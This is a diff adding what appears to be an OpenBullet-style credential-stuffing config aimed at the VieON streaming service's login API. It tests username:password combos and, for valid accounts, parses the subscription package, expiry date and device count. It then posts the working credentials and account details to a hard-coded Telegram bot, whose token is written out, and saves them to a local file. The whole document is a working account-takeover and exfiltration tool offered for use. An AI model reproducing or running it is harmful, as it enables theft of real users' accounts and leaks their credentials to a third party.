@@ -1,0 +1,77 @@
+HttpRequest xNet POST $"https://api.vieon.vn/backend/user/login/mobile?platform=web&ui=" 
+  CONTENT $"phone_number=<USER>&password=<PASS>&device_id=7199174a4d031580905c47f6e0172f7f&platform=web&model=Windows%2010&push_token=&ui=012021" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER $"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36" 
+  HEADER $"Pragma: no-cache" 
+  HEADER $"Accept: */*" 
+  HEADER $"origin: https://vieon.vn" 
+  HEADER $"referer: https://vieon.vn/" 
+  HEADER $"sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"" 
+  HEADER $"sec-ch-ua-mobile: ?0" 
+  HEADER $"sec-fetch-dest: empty" 
+  HEADER $"sec-fetch-mode: cors" 
+  HEADER $"sec-fetch-site: same-site" 
+
+KeyCheck 
+  KEYCHAIN Failure OR 
+    KEY $"\":\"Số điện thoại hoặc mật khẩu chưa đúng\"}" 
+    KEY $"\"Tài khoản không tồn tại\"}" 
+  KEYCHAIN Success OR 
+    KEY $"\"is_first_login\":" 
+    KEY $"\"status\":1" 
+
+Parse $"<SOURCE>" LR $"{\"access_token\":\"" $"\"," -> VAR "token" 
+
+#info HttpRequest xNet GET $"https://api.vieon.vn/backend/billing/transaction-success?limit=30&platform=web&ui=" 
+  
+  HEADER $": scheme: https" 
+  HEADER $"accept: application/json, text/plain, */*" 
+  HEADER $"accept-encoding: gzip, deflate, br" 
+  HEADER $"accept-language: en-US,en;q=0.9,vi;q=0.8" 
+  HEADER $"authorization: <token>" 
+  HEADER $"sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"" 
+  HEADER $"sec-ch-ua-mobile: ?0" 
+  HEADER $"sec-fetch-dest: empty" 
+  HEADER $"sec-fetch-mode: cors" 
+  HEADER $"sec-fetch-site: same-site" 
+  HEADER $"user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36" 
+
+#Name Parse $"<SOURCE>" LR $"\"name\":\"" $"\"," CreateEmpty=False -> CAP "package" 
+  SAFE 
+
+#by ConstantString $"by fb/xuantothanh123" -> VAR "by" 
+
+#expires Parse $"<SOURCE>" LR $"\"expired_date\":\"" $" " -> VAR "expires" 
+
+DateToUnixTime $"<expires>" $"yyyy-MM-dd" -> VAR "DU" 
+
+CurrentUnixTime -> VAR "CU" 
+
+Compute $"((<DU>-<CU>)/86400)" AdvEx=True -> VAR "time" 
+
+RoundToInt $"<time>" -> CAP "RemainingDay" 
+
+CountOccurrences $"<SOURCE>" $"sub_id" -> VAR "CountDevice" 
+
+KeyCheck 
+  KEYCHAIN Custom "FREE" OR 
+    KEY $"{\"items\":[],\"" 
+  KEYCHAIN Success OR 
+    KEY $"VIP" 
+    KEY $"All" 
+    KEY $"package" 
+    KEY $"time" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<time>" Contains $"-" 
+
+CurrentUnixTime -> VAR "date" 
+
+UnixTimeToDate $"<date>" $"dd/MM/yyyy" -> VAR "Ngày Check" 
+
+HttpRequest xNet POST $"https://api.telegram.org/bot6690631010:AAHC5RDOtXmS5riiQUey5rpofmvyqlpUxQY/sendmessage?chat_id=1407009078" 
+  CONTENT $"CONTENT &text=<USER>:<PASS> | Ngày Check <Ngày Check> | Gói: <package> | Ngày Hết Hạn: <expires> | Số Ngày Còn Lại: <RemainingDay> | Số Thiết Bị = <CountDevice>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+
+FileAppendLines $"vieonn.txt" 
+  CONTENT $"<USER>:<PASS>| Gói: <package> | Ngày Hết Hạn: <expires> | Số Ngày Còn Lại: <time> | Số Thiết Bị = <CountDevice>" 
+
